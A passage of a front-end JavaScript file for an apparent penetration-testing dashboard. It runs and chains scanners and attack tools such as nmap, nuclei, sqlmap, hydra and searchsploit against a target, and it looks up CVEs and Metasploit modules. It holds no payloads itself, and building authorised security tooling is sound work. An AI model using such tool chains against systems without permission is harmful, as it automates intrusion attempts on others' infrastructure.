// State
let allTools = [];
let selectedToolId = null;
let selectedToolConfig = null;
let pipelineSteps = [];
let pipelineStepId = 0;

// Tab switching — delegates to tabs.js module; kept as a function because it is
// called programmatically from within this file (e.g. after CVE lookup, pipeline run).
function switchManualTab(tab) {
    if (window.activateTab) {
        window.activateTab('manual-tabs', tab);
    }
}

// Load tools
async function loadTools() {
    try {
        const { data, error } = await spectraApi.get('/api/v1/tools');
        allTools = data?.tools || data || [];
        renderToolPicker(allTools);
    } catch (e) {
        document.getElementById('tool-picker').innerHTML = '<div class="text-red-400 text-sm p-2">Failed to load tools</div>';
    }
}

function filterTools() {
    const q = document.getElementById('tool-search').value.toLowerCase();
    const filtered = allTools.filter(t =>
        t.name.toLowerCase().includes(q) || t.id.toLowerCase().includes(q) ||
        t.description.toLowerCase().includes(q) || (t.category || '').toLowerCase().includes(q)
    );
    renderToolPicker(filtered);
}

function renderToolPicker(tools) {
    const container = document.getElementById('tool-picker');
    if (!tools.length) {
        container.innerHTML = '<div class="empty-state py-6"><i data-lucide="search" class="w-6 h-6 inline-block text-slate-600"></i><p class="text-slate-500 text-xs mt-2">No tools found</p></div>';
        if (typeof lucide !== 'undefined') lucide.createIcons();
        return;
    }
    container.innerHTML = tools.map(t => {
        const statusDot = t.status === 'ready' ? 'bg-emerald-500' : t.status === 'installing' ? 'bg-blue-400 animate-pulse' : 'bg-amber-500';
        const sel = selectedToolId === t.id ? 'selected' : '';
        return `<div class="tool-card rounded-lg p-3 cursor-pointer glass-panel ${sel}" onclick="selectManualTool('${escapeHtml(t.id)}')">
            <div class="flex items-center gap-2.5">
                <div class="w-2 h-2 rounded-full ${statusDot} shrink-0"></div>
                <div class="min-w-0">
                    <div class="text-sm font-medium text-white truncate">${escapeHtml(t.name)}</div>
                    <div class="text-xs text-slate-500 truncate">${escapeHtml(t.category)} · ${escapeHtml(t.description.slice(0, 40))}...</div>
                </div>
            </div>
        </div>`;
    }).join('');
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

// Select tool and build form
async function selectManualTool(toolId) {
    selectedToolId = toolId;
    renderToolPicker(allTools.filter(t => {
        const q = document.getElementById('tool-search').value.toLowerCase();
        return !q || t.name.toLowerCase().includes(q) || t.id.toLowerCase().includes(q) || t.description.toLowerCase().includes(q);
    }));

    document.getElementById('no-tool-selected').classList.add('hidden');
    document.getElementById('tool-form-content').classList.remove('hidden');
    document.getElementById('form-tool-name').textContent = 'Loading...';

    try {
        const { data: cfg } = await spectraApi.get(`/api/v1/tools/${toolId}/config`);
        selectedToolConfig = cfg;
        buildForm(cfg);
    } catch (e) {
        document.getElementById('form-tool-name').textContent = 'Error loading config';
    }
}

// Tool chaining suggestions
const TOOL_CHAINS = {
    nmap: ['nuclei', 'nikto', 'searchsploit', 'gobuster'],
    nuclei: ['searchsploit', 'sqlmap', 'nikto'],
    nikto: ['sqlmap', 'gobuster', 'dirsearch'],
    whatweb: ['nikto', 'nuclei', 'wpscan'],
    gobuster: ['nikto', 'sqlmap', 'ffuf'],
    dirsearch: ['nikto', 'sqlmap', 'ffuf'],
    subfinder: ['nmap', 'httpx', 'nuclei'],
    httpx: ['nuclei', 'nikto', 'gobuster'],
    wpscan: ['sqlmap', 'nuclei'],
    naabu: ['nmap', 'nuclei', 'httpx'],
    feroxbuster: ['nikto', 'sqlmap'],
};

let lastToolOutput = '';

function getSchemaFields(schema) {
    const properties = schema && typeof schema === 'object' ? (schema.properties || {}) : {};
    const required = new Set(Array.isArray(schema?.required) ? schema.required : []);
    return Object.entries(properties).map(([name, spec]) => ({
        name,
        spec: spec || {},
        required: required.has(name),
    }));
}

function schemaPlaceholder(name, spec) {
    if (spec.placeholder) return spec.placeholder;
    if (spec.description) return spec.description;
    if (spec.examples && spec.examples.length) return String(spec.examples[0]);
    return name;
}

function renderSchemaField(name, spec, required) {
    const fieldId = `arg-${name}`;
    const label = `${escapeHtml(name)}${required ? ' *' : ''}`;
    const description = spec.description ? `<div class="text-xs text-slate-500 mt-1">${escapeHtml(spec.description)}</div>` : '';
    const defaultValue = spec.default ?? '';

    if (Array.isArray(spec.enum) && spec.enum.length) {
        const options = spec.enum.map(value => {
            const selected = String(value) === String(defaultValue) ? ' selected' : '';
            return `<option value="${escapeHtml(String(value))}"${selected}>${escapeHtml(String(value))}</option>`;
        }).join('');
        return `<div class="arg-field">
            <label class="block text-xs font-bold text-slate-500 uppercase mb-1">${label}</label>
            <select id="${fieldId}" class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white focus:outline-none">${options}</select>
            ${description}
        </div>`;
    }

    if (spec.type === 'boolean') {
        const checked = defaultValue ? ' checked' : '';
        return `<div class="arg-field">
            <label class="flex items-center gap-2 text-sm text-white">
                <input type="checkbox" id="${fieldId}" class="accent-violet-500"${checked}>
                <span>${escapeHtml(name)}</span>
            </label>
            ${description}
        </div>`;
    }

    const inputType = spec.type === 'integer' || spec.type === 'number' ? 'number' : 'text';
    const valueAttr = defaultValue !== '' ? ` value="${escapeHtml(String(defaultValue))}"` : '';
    const minAttr = spec.minimum !== undefined ? ` min="${escapeHtml(String(spec.minimum))}"` : '';
    const maxAttr = spec.maximum !== undefined ? ` max="${escapeHtml(String(spec.maximum))}"` : '';
    const stepAttr = spec.type === 'number' ? ' step="any"' : '';

    return `<div class="arg-field">
        <label class="block text-xs font-bold text-slate-500 uppercase mb-1">${label}</label>
        <input type="${inputType}" id="${fieldId}"${valueAttr}${minAttr}${maxAttr}${stepAttr}
            placeholder="${escapeHtml(schemaPlaceholder(name, spec))}"
            class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none">
        ${description}
    </div>`;
}

function buildForm(cfg) {
    document.getElementById('form-tool-name').textContent = cfg.name;
    document.getElementById('form-tool-desc').textContent = cfg.metadata.ai_description || cfg.description;

    const riskEl = document.getElementById('form-tool-risk');
    const rl = cfg.metadata.risk_level || 'low';
    riskEl.textContent = rl;
    riskEl.className = `px-2 py-0.5 rounded text-xs font-mono uppercase tracking-wide risk-${rl}`;

    const badge = document.getElementById('tool-icon-badge');
    badge.className = `w-10 h-10 rounded-lg flex items-center justify-center text-lg bg-${cfg.ui.color || 'violet'}-500/20 text-${cfg.ui.color || 'violet'}-400`;
    badge.innerHTML = `<i data-lucide="${getIcon(cfg.ui.icon)}" class="w-5 h-5 inline-block"></i>`;
    if (typeof lucide !== 'undefined') lucide.createIcons();

    const globalTarget = document.getElementById('global-target')?.value || '';
    document.getElementById('next-tool-suggestions').classList.add('hidden');

    const container = document.getElementById('args-container');
    const placeholders = cfg.placeholders || [];
    const schemaFields = getSchemaFields(cfg.args_schema).filter(field => field.name !== 'output_file');

    let html = `<div class="arg-field">
        <label class="block text-xs font-bold text-slate-500 uppercase mb-1">Target *</label>
        <input type="text" id="arg-target" value="${escapeHtml(globalTarget)}" placeholder="e.g. 192.168.1.1 or example.com"
            class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none">
    </div>`;

    if (schemaFields.length) {
        schemaFields.forEach(({ name, spec, required }) => {
            if (name === 'target') return;
            html += renderSchemaField(name, spec, required);
        });
    } else {
        placeholders.forEach(p => {
            if (p === 'target') return;
            const modifier = (cfg.arg_modifiers || {})[p];
            const hint = modifier ? `Prefix: ${modifier.prefix || 'none'}, Sep: ${modifier.separator || 'space'}` : '';
            const isWordlist = /^(wordlist|dictionary|w)$/i.test(p);
            if (isWordlist) {
                html += `<div class="arg-field">
                    <label class="block text-xs font-bold text-slate-500 uppercase mb-1">${p}</label>
                    <div class="relative">
                        <input type="text" id="arg-${p}" list="wordlist-options" placeholder="${hint || 'Select or type wordlist path'}"
                            class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none">
                        <datalist id="wordlist-options"></datalist>
        <button type="button" onclick="refreshWordlistOptions()" class="absolute right-2 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white text-xs" title="Refresh wordlists"><i data-lucide="rotate-ccw" class="w-3.5 h-3.5 inline-block"></i></button>
                    </div>
                </div>`;
                setTimeout(refreshWordlistOptions, 100);
            } else {
                html += `<div class="arg-field">
                    <label class="block text-xs font-bold text-slate-500 uppercase mb-1">${p}</label>
                    <input type="text" id="arg-${p}" placeholder="${hint || p}"
                        class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none">
                </div>`;
            }
        });
    }

    html += `<div class="arg-field">
        <label class="block text-xs font-bold text-slate-500 uppercase mb-1">Timeout (s)</label>
        <input type="number" id="arg-timeout" value="${cfg.timeout || 300}" min="10" max="3600"
            class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white focus:outline-none">
    </div>`;

    container.innerHTML = html;
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function getIcon(category) {
    const icons = {
        'scanner': 'radar',
        'recon': 'search',
        'web': 'globe',
        'brute': 'key',
        'exploit': 'shield',
        'network': 'network',
        'infrastructure': 'server',
        'crosshair': 'crosshair',
        'database': 'database',
        'terminal': 'terminal',
        'bug': 'bug',
        'lightning': 'zap',
        'folder-open': 'folder-open',
        'shield-warning': 'shield-alert',
        'key': 'key',
        'shield': 'shield',
        'globe': 'globe',
        'default': 'wrench',
    };
    return icons[category] || icons['default'];
}

// Execute tool
async function executeManualTool() {
    if (!selectedToolConfig) return;
    const target = document.getElementById('arg-target')?.value;
    if (!target) { _spectraToast('Target is required', 'warning'); return; }

    const args = {};
    const schemaFields = getSchemaFields(selectedToolConfig.args_schema).filter(field => field.name !== 'target' && field.name !== 'output_file');
    if (schemaFields.length) {
        schemaFields.forEach(({ name, spec }) => {
            const input = document.getElementById('arg-' + name);
            if (!input) return;
            let val;
            if (spec.type === 'boolean') {
                val = input.checked;
                if (val || spec.default) args[name] = val;
                return;
            }
            val = input.value;
            if (val === '' || val === undefined || val === null) return;
            if (spec.type === 'integer') args[name] = parseInt(val, 10);
            else if (spec.type === 'number') args[name] = parseFloat(val);
            else if (spec.type === 'array') args[name] = String(val).split(',').map(v => v.trim()).filter(Boolean);
            else args[name] = val;
        });
    } else {
        (selectedToolConfig.placeholders || []).forEach(p => {
            if (p === 'target') return;
            const val = document.getElementById('arg-' + p)?.value;
            if (val) args[p] = val;
        });
    }
    const timeout = parseInt(document.getElementById('arg-timeout')?.value) || 300;

    const btn = document.getElementById('run-btn');
    const status = document.getElementById('exec-status');
    btn.disabled = true;
    btn.innerHTML = '<i data-lucide="loader" class="w-4 h-4 inline-block animate-spin"></i> Running...';
    if (typeof lucide !== 'undefined') lucide.createIcons();
    status.textContent = 'Executing...';

    const outputArea = document.getElementById('output-area');
    outputArea.innerHTML = `<span class="text-violet-400">$ ${escapeHtml(selectedToolConfig.command)} ... ${escapeHtml(target)}</span>\n<span class="text-slate-500">Waiting for results...</span>\n`;
    document.getElementById('output-tool-label').textContent = selectedToolConfig.name;
    document.getElementById('output-duration').textContent = '';
    document.getElementById('findings-panel').classList.add('hidden');
    document.getElementById('output-findings-count').classList.add('hidden');

    const startTime = Date.now();
    const timer = setInterval(() => {
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(0);
        status.textContent = `Running... ${elapsed}s`;
    }, 1000);

    try {
        const res = await spectraApi.post(`/api/v1/tools/${selectedToolConfig.id}/test`, {target, args, timeout});
        const result = res.data;
        clearInterval(timer);

        const dur = result.duration_seconds?.toFixed(1) || '0';
        document.getElementById('output-duration').textContent = `${dur}s`;
        status.textContent = result.success ? 'Completed' : 'Failed';
        status.className = 'text-xs ml-auto font-mono ' + (result.success ? 'text-emerald-400' : 'text-rose-400');

        let out = `<span class="text-violet-400">$ ${escapeHtml(selectedToolConfig.command)} ${escapeHtml(selectedToolConfig.args_template)}</span>\n`;
        out += `<span class="text-slate-500">Target: ${escapeHtml(target)} | Exit: ${result.exit_code} | Duration: ${dur}s</span>\n\n`;

        if (result.stdout) {
            out += colorizeOutput(escapeHtml(result.stdout));
        }
        if (result.stderr) {
            out += `\n<span class="text-amber-500/70">${escapeHtml(result.stderr)}</span>`;
        }
        if (!result.stdout && !result.stderr) {
            out += '<span class="text-slate-500">(no output)</span>';
        }
        outputArea.innerHTML = out;

        // Show findings
        if (result.parsed_findings?.length > 0) {
            document.getElementById('findings-panel').classList.remove('hidden');
            document.getElementById('output-findings-count').classList.remove('hidden');
            document.getElementById('output-findings-count').textContent = `${result.parsed_findings_count} findings`;
            renderFindings(result.parsed_findings);
        }

        // Store output, log to session, and show next-tool suggestions
        lastToolOutput = result.stdout || '';
        addToHistory({
            time: new Date(), tool: selectedToolConfig.name, toolId: selectedToolConfig.id,
            target, status: result.success, duration: result.duration_seconds || 0,
            output: result.stdout || '', stderr: result.stderr || '', args
        });
        logToSession(
            `Ran ${selectedToolConfig.name} against ${target}`,
            selectedToolConfig.id,
            result.parsed_findings || []
        );
        showNextToolSuggestions(selectedToolConfig.id);
    } catch (e) {
        clearInterval(timer);
        outputArea.innerHTML += `\n<span class="text-red-400">Error: ${escapeHtml(e.message)}</span>`;
        status.textContent = 'Error';
        status.className = 'text-xs ml-auto font-mono text-rose-400';
    } finally {
        btn.disabled = false;
        btn.innerHTML = '<i data-lucide="play" class="w-4 h-4 inline-block"></i> Run';
        if (typeof lucide !== 'undefined') lucide.createIcons();
    }
}

let allFindings = [];
let lastParsedFindings = [];

function renderFindings(findings) {
    lastParsedFindings = findings;
    findings.forEach(f => {
        f._source = selectedToolConfig?.id || 'unknown';
        if (!allFindings.some(e => findingKey(e) === findingKey(f))) allFindings.push(f);
    });
    updateFindingsCount();

    const list = document.getElementById('findings-list');
    list.innerHTML = findings.slice(0, 30).map((f, i) => {
        const sev = f.severity || f.state || 'info';
        const title = f.name || f.service || f.title || f.template_id || `Finding ${i+1}`;
        const detail = f.port ? `Port ${f.port}` : f.host || f.url || '';
        const product = [f.product, f.version].filter(Boolean).join(' ');
        const sevColor = {critical:'text-rose-400',high:'text-amber-400',medium:'text-blue-400',low:'text-slate-400',open:'text-emerald-400',info:'text-slate-500'}[sev.toLowerCase()] || 'text-slate-400';

        let actions = '';
        if (product) {
            actions += `<button onclick="lookupCVEsFor('${escapeAttr(product)}')" class="px-1.5 py-0.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 rounded text-xs transition-colors" title="Search CVEs for ${escapeAttr(product)}"><i data-lucide="shield-alert" class="w-3.5 h-3.5 inline-block"></i></button>`;
            actions += `<button onclick="runToolOn('searchsploit','${escapeAttr(product)}')" class="px-1.5 py-0.5 bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 rounded text-xs transition-colors" title="SearchSploit"><i data-lucide="search" class="w-3.5 h-3.5 inline-block"></i></button>`;
        }
        if (f.port || f.portid) {
            const host = f.ip || f.host || document.getElementById('global-target')?.value || '';
            const port = f.portid || f.port;
            const svc = (f.service || '').toLowerCase();
            const proto = (svc.includes('ssl') || svc.includes('https') || port == 443) ? 'https' : 'http';
            const url = `${proto}://${host}:${port}`;
            actions += `<button onclick="runToolOn('nuclei','${escapeAttr(url)}')" class="px-1.5 py-0.5 bg-violet-500/10 hover:bg-violet-500/20 text-violet-400 rounded text-xs transition-colors" title="Scan with Nuclei"><i data-lucide="bug" class="w-3.5 h-3.5 inline-block"></i></button>`;
            if (svc.includes('http')) {
                actions += `<button onclick="runToolOn('nikto','${escapeAttr(url)}')" class="px-1.5 py-0.5 bg-blue-500/10 hover:bg-blue-500/20 text-blue-400 rounded text-xs transition-colors" title="Scan with Nikto"><i data-lucide="globe" class="w-3.5 h-3.5 inline-block"></i></button>`;
            }
        }

        return `<div class="flex items-center gap-2 text-xs p-2 rounded bg-white/[0.02] hover:bg-white/[0.04] group">
            <span class="font-mono ${sevColor} uppercase w-14 text-xs shrink-0">${sev}</span>
            <span class="text-white truncate flex-1">${escapeHtml(title)}</span>
            <span class="text-slate-500 shrink-0 text-xs">${escapeHtml(detail)}</span>
            <div class="flex gap-1 shrink-0 opacity-0 group-hover:opacity-100 transition-opacity">${actions}</div>
        </div>`;
    }).join('');
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function findingKey(f) {
    return [f.name||f.service||'', f.host||f.ip||'', f.port||f.portid||'', f.severity||''].join('|');
}

function updateFindingsCount() {
    const badge = document.getElementById('all-findings-count');
    if (badge) badge.textContent = allFindings.length;
}

function escapeAttr(s) { return s.replace(/'/g, "\\'").replace(/"/g, '&quot;'); }

function lookupCVEsFor(product) {
    switchManualTab('cve');
    const parts = product.split(' ');
    document.getElementById('cve-product').value = parts[0] || '';
    document.getElementById('cve-version').value = parts.slice(1).join(' ') || '';
    searchCVEs();
}

function runToolOn(toolId, target) {
    selectManualTool(toolId);
    setTimeout(() => {
        const targetInput = document.getElementById('arg-target');
        if (targetInput) targetInput.value = target;
    }, 300);
}

function colorizeOutput(text) {
    return text
        .replace(/(\[(\+|SUCCESS|FOUND|open)\])/gi, '<span class="text-emerald-400">$1</span>')
        .replace(/(\[(-|FAIL|ERROR|closed)\])/gi, '<span class="text-rose-400">$1</span>')
        .replace(/(\[(WARNING|WARN|\*)\])/gi, '<span class="text-amber-400">$1</span>')
        .replace(/(\[(INFO|i)\])/gi, '<span class="text-blue-400">$1</span>')
        .replace(/(CVE-\d{4}-\d+)/g, '<span class="text-rose-300 font-medium">$1</span>')
        .replace(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g, '<span class="text-violet-300">$1</span>');
}

function clearOutput() {
    document.getElementById('output-area').innerHTML = '<span class="text-slate-500">Select a tool and click Run to see output here.</span>';
    document.getElementById('findings-panel').classList.add('hidden');
    document.getElementById('output-findings-count').classList.add('hidden');
    document.getElementById('output-duration').textContent = '';
    document.getElementById('exec-status').textContent = '';
    document.getElementById('exec-status').className = 'text-xs text-slate-500 ml-auto font-mono';
}

function showNextToolSuggestions(toolId) {
    const suggestions = TOOL_CHAINS[toolId] || [];
    const panel = document.getElementById('next-tool-suggestions');
    const list = document.getElementById('suggestions-list');
    if (!suggestions.length) { panel.classList.add('hidden'); return; }

    const available = suggestions.filter(id => allTools.some(t => t.id === id));
    if (!available.length) { panel.classList.add('hidden'); return; }

    panel.classList.remove('hidden');
    list.innerHTML = available.map(id => {
        const tool = allTools.find(t => t.id === id);
        const name = tool ? tool.name : id;
        return `<button onclick="chainToTool('${id}')" class="px-3 py-1.5 bg-slate-800 hover:bg-violet-500/10 border border-white/5 rounded-lg text-xs text-slate-300 transition-colors flex items-center gap-1.5">
            <i data-lucide="arrow-right" class="w-3.5 h-3.5 inline-block text-violet-400"></i> ${escapeHtml(name)}
        </button>`;
    }).join('');
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function chainToTool(toolId) {
    const smartTarget = buildSmartTarget(toolId, lastParsedFindings, lastToolOutput);
    selectManualTool(toolId);
    setTimeout(() => {
        const targetInput = document.getElementById('arg-target');
        if (targetInput && smartTarget) targetInput.value = smartTarget;
    }, 300);
}

// Pipeline templates
function loadPipelineTemplate(templateId) {
    const globalTarget = document.getElementById('global-target')?.value || '';
    const templates = {
        recon: ['nmap', 'nikto', 'gobuster'],
        vuln: ['nmap', 'nuclei', 'searchsploit'],
        web: ['whatweb', 'nikto', 'sqlmap'],
    };
    const chain = templates[templateId];
    if (!chain) return;

    pipelineSteps = [];
    pipelineStepId = 0;
    const canvas = document.getElementById('pipeline-canvas');
    canvas.innerHTML = '';

    chain.forEach((toolId, i) => {
        addPipelineStep();
        const step = pipelineSteps[pipelineSteps.length - 1];
        const node = document.getElementById('pipeline-node-' + step.id);
        if (node) {
            node.querySelector('select').value = toolId;
            step.toolId = toolId;
            const targetInput = document.getElementById('pipeline-target-' + step.id);
            if (i === 0 && globalTarget && targetInput) {
                targetInput.value = globalTarget;
            }
        }
    });
}

// Auto-fill global target into pipeline first step
document.getElementById('global-target')?.addEventListener('change', function() {
    const val = this.value;
    const firstTarget = document.getElementById('pipeline-target-1');
    if (firstTarget && !firstTarget.value) firstTarget.value = val;
});

// === Pipeline ===
function addPipelineStep() {
    document.getElementById('pipeline-empty')?.remove();
    const canvas = document.getElementById('pipeline-canvas');
    const stepNum = pipelineSteps.length;
    const id = ++pipelineStepId;

    if (stepNum > 0) {
        const conn = document.createElement('div');
        conn.className = 'pipeline-connector shrink-0';
        conn.innerHTML = '<i data-lucide="arrow-right" class="w-3.5 h-3.5 inline-block"></i>';
        canvas.appendChild(conn);
    }

    const node = document.createElement('div');
    node.className = 'pipeline-node shrink-0 animate-fade-in-up';
    node.id = 'pipeline-node-' + id;
    node.innerHTML = `
        <div class="flex items-center justify-between mb-2">
            <span class="text-xs font-mono text-slate-500">Step ${stepNum + 1}</span>
            <button onclick="removePipelineStep(${id})" class="text-slate-600 hover:text-rose-400 text-xs transition-colors" aria-label="Remove step"><i data-lucide="x" class="w-3.5 h-3.5 inline-block"></i></button>
        </div>
        <select onchange="updatePipelineStep(${id}, this.value)" class="w-full px-2 py-1.5 bg-black/30 border border-white/10 rounded text-sm text-white mb-2 focus:outline-none focus:border-violet-500">
            <option value="">Select tool...</option>
            ${allTools.map(t => `<option value="${escapeHtml(t.id)}">${escapeHtml(t.name)}</option>`).join('')}
        </select>
        <input type="text" placeholder="Target / Args" id="pipeline-target-${id}"
            class="w-full px-2 py-1.5 bg-black/30 border border-white/10 rounded text-xs text-white placeholder-slate-600 focus:outline-none focus:border-violet-500">
        <div class="text-xs text-slate-600 mt-1.5">Use <code class="text-violet-400">{prev}</code> for previous output</div>
    `;
    canvas.appendChild(node);
    pipelineSteps.push({id, toolId: '', target: ''});
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function removePipelineStep(id) {
    const idx = pipelineSteps.findIndex(s => s.id === id);
    if (idx === -1) return;
    pipelineSteps.splice(idx, 1);
    // Rebuild pipeline canvas
    rebuildPipelineCanvas();
}

function updatePipelineStep(id, toolId) {
    const step = pipelineSteps.find(s => s.id === id);
    if (step) step.toolId = toolId;
}

function rebuildPipelineCanvas() {
    const canvas = document.getElementById('pipeline-canvas');
    canvas.innerHTML = '';
    if (pipelineSteps.length === 0) {
        canvas.innerHTML = '<div class="empty-state" id="pipeline-empty"><i data-lucide="git-branch" class="w-5 h-5 inline-block text-violet-400/40"></i><h3>Build your pipeline</h3><p>Click "Add Step" to chain tools together.</p></div>';
        if (typeof lucide !== 'undefined') lucide.createIcons();
        return;
    }
    const saved = [...pipelineSteps];
    pipelineSteps = [];
    pipelineStepId = 0;
    saved.forEach(s => {
        addPipelineStep();
        const last = pipelineSteps[pipelineSteps.length - 1];
        const node = document.getElementById('pipeline-node-' + last.id);
        if (node && s.toolId) {
            node.querySelector('select').value = s.toolId;
            last.toolId = s.toolId;
        }
    });
}

async function runPipeline() {
    const output = document.getElementById('pipeline-output');
    const btn = document.getElementById('pipeline-run-btn');

    if (pipelineSteps.length === 0) { _spectraToast('Add at least one step', 'warning'); return; }

    btn.disabled = true;
    btn.innerHTML = '<i data-lucide="loader" class="w-4 h-4 inline-block animate-spin mr-1"></i> Running...';
    output.innerHTML = '';

    let previousOutput = '';
    let previousFindings = [];

    for (let i = 0; i < pipelineSteps.length; i++) {
        const step = pipelineSteps[i];
        if (!step.toolId) {
            output.innerHTML += `<span class="text-amber-400">Step ${i+1}: No tool selected, skipping\n</span>`;
            continue;
        }

        const node = document.getElementById('pipeline-node-' + step.id);
        node?.classList.add('active');
        let target = document.getElementById('pipeline-target-' + step.id)?.value || '';

        if (target.includes('{prev}') && previousOutput) {
            target = target.replace('{prev}', previousOutput.trim().split('\n')[0]);
        } else if (!target && i > 0) {
            target = buildSmartTarget(step.toolId, previousFindings, previousOutput);
        }

        if (!target) {
            output.innerHTML += `<span class="text-amber-400">Step ${i+1} (${escapeHtml(step.toolId)}): No target, skipping\n</span>`;
            node?.classList.remove('active');
            continue;
        }

        output.innerHTML += `<span class="text-violet-400">━━━ Step ${i+1}: ${escapeHtml(step.toolId)} → ${escapeHtml(target)} ━━━</span>\n`;
        output.innerHTML += `<span class="text-slate-500">Executing...</span>\n`;
        output.scrollTop = output.scrollHeight;

        try {
            const res = await spectraApi.post(`/api/v1/tools/${step.toolId}/test`, {target, args: {}, timeout: 300});
            const result = res.data;
            const statusIcon = result.success ? '<span class="text-emerald-400">✓</span>' : '<span class="text-rose-400">✗</span>';
            output.innerHTML += `${statusIcon} Exit: ${result.exit_code} | Duration: ${result.duration_seconds?.toFixed(1) || 0}s | Findings: ${result.parsed_findings_count || 0}\n`;

            if (result.stdout) {
                const preview = result.stdout.slice(0, 1500);
                output.innerHTML += escapeHtml(preview) + (result.stdout.length > 1500 ? '\n...(truncated)' : '') + '\n';
                previousOutput = result.stdout;
                previousFindings = result.parsed_findings || [];
            }
            if (result.stderr) {
                output.innerHTML += `<span class="text-amber-500/60">${escapeHtml(result.stderr.slice(0, 500))}</span>\n`;
            }
        } catch (e) {
            output.innerHTML += `<span class="text-rose-400">Error: ${escapeHtml(e.message)}</span>\n`;
        }

        node?.classList.remove('active');
        output.innerHTML += '\n';
        output.scrollTop = output.scrollHeight;
    }

    output.innerHTML += `<span class="text-emerald-400">━━━ Pipeline complete ━━━</span>\n`;
    btn.disabled = false;
    btn.innerHTML = '<i data-lucide="play" class="w-4 h-4 inline-block mr-1"></i> Run Pipeline';
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

// Smart pipeline data passing: extract the right input for the next tool from previous findings
function buildSmartTarget(nextToolId, findings, rawOutput) {
    const globalTarget = document.getElementById('global-target')?.value || '';

    if (!findings.length) {
        return rawOutput ? rawOutput.trim().split('\n')[0] : globalTarget;
    }

    // searchsploit needs "product version" queries
    if (nextToolId === 'searchsploit') {
        const queries = findings
            .filter(f => f.product || f.service)
            .map(f => [f.product, f.version].filter(Boolean).join(' '))
            .filter(Boolean);
        return queries[0] || globalTarget;
    }

    // nuclei/nikto/gobuster/ffuf/dirsearch need URLs
    if (['nuclei', 'nikto', 'gobuster', 'ffuf', 'dirsearch', 'feroxbuster'].includes(nextToolId)) {
        const urls = findings
            .filter(f => f.portid || f.port)
            .map(f => {
                const host = f.ip || f.host || globalTarget;
                const port = f.portid || f.port;
                const svc = (f.service || '').toLowerCase();
                const proto = (svc.includes('ssl') || svc.includes('https') || port == 443) ? 'https' : 'http';
                return `${proto}://${host}:${port}`;
            });
        return urls[0] || globalTarget;
    }

    // sqlmap needs a URL
    if (nextToolId === 'sqlmap') {
        const webFindings = findings.filter(f => {
            const port = f.portid || f.port;
            const svc = (f.service || '').toLowerCase();
            return svc.includes('http') || port == 80 || port == 443 || port == 8080;
        });
        if (webFindings.length) {
            const f = webFindings[0];
            const host = f.ip || f.host || globalTarget;
            const port = f.portid || f.port;
            return `http://${host}:${port}/`;
        }
        return globalTarget;
    }

    // hydra needs host
    if (nextToolId === 'hydra') {
        const sshFindings = findings.filter(f => (f.service || '').toLowerCase().includes('ssh'));
        if (sshFindings.length) {
            return sshFindings[0].ip || sshFindings[0].host || globalTarget;
        }
        return globalTarget;
    }

    // Default: use first finding's host or global target
    const first = findings[0];
    return first?.ip || first?.host || first?.['matched-at'] || globalTarget;
}

// === CVE Lookup ===
async function searchCVEs() {
    const product = document.getElementById('cve-product')?.value?.trim();
    const version = document.getElementById('cve-version')?.value?.trim();
    const service = document.getElementById('cve-service')?.value?.trim();
    const results = document.getElementById('cve-results');
    const countEl = document.getElementById('cve-count');
    const btn = document.getElementById('cve-search-btn');

    if (!product && !service) {
        results.innerHTML = '<div class="text-amber-400 text-sm text-center py-4">Enter a product or service name.</div>';
        return;
    }

    btn.disabled = true;
    btn.innerHTML = '<i data-lucide="loader" class="w-4 h-4 inline-block animate-spin mr-1"></i> Searching...';
    results.innerHTML = '<div class="text-slate-500 text-sm text-center py-8">Searching CVE databases...</div>';

    try {
        const params = new URLSearchParams();
        if (product) params.set('product', product);
        if (version) params.set('version', version);
        if (service) params.set('service', service);

        const res = await spectraApi.get('/api/v1/cve/lookup?' + params.toString());
        const data = res.data;
        const cves = data?.cves || [];
        countEl.textContent = `${data.total || cves.length} found`;

        if (!cves.length) {
            results.innerHTML = '<div class="text-slate-500 text-sm text-center py-8">No CVEs found for this query.</div>';
            return;
        }

        results.innerHTML = cves.map(c => {
            const sevColor = {critical:'text-rose-400 bg-rose-500/10',high:'text-amber-400 bg-amber-500/10',medium:'text-blue-400 bg-blue-500/10',low:'text-slate-400 bg-slate-500/10'}[(c.severity||'').toLowerCase()] || 'text-slate-400 bg-slate-500/10';
            const cveId = c.cve_id || c.cve || c.id || 'N/A';

            let msfHtml = '';
            if (c.metasploit_modules && c.metasploit_modules.length > 0) {
                msfHtml = `<div class="mt-2 pt-2 border-t border-white/5">
                    <div class="flex items-center gap-2 mb-1.5">
                        <i data-lucide="skull" class="w-3.5 h-3.5 inline-block text-rose-400"></i>
                        <span class="text-xs font-bold text-rose-400 uppercase">Metasploit Modules</span>
                    </div>
                    <div class="space-y-1">
                        ${c.metasploit_modules.map(m => `
                            <div class="flex items-center gap-2 text-[11px] px-2 py-1 bg-black/30 rounded group">
                                <span class="px-1 py-0.5 rounded text-xs font-mono uppercase ${m.type === 'exploit' ? 'bg-rose-500/20 text-rose-400' : 'bg-blue-500/20 text-blue-400'}">${escapeHtml(m.type)}</span>
                                <code class="text-slate-300 font-mono truncate flex-1">${escapeHtml(m.module)}</code>
                                <span class="text-xs text-slate-500 font-mono">${escapeHtml(m.rank || '')}</span>
                                <button onclick="navigator.clipboard.writeText('${escapeAttr(m.module)}')" class="opacity-0 group-hover:opacity-100 px-1.5 py-0.5 bg-slate-700 hover:bg-slate-600 text-slate-300 rounded text-xs transition-all" title="Copy module path">
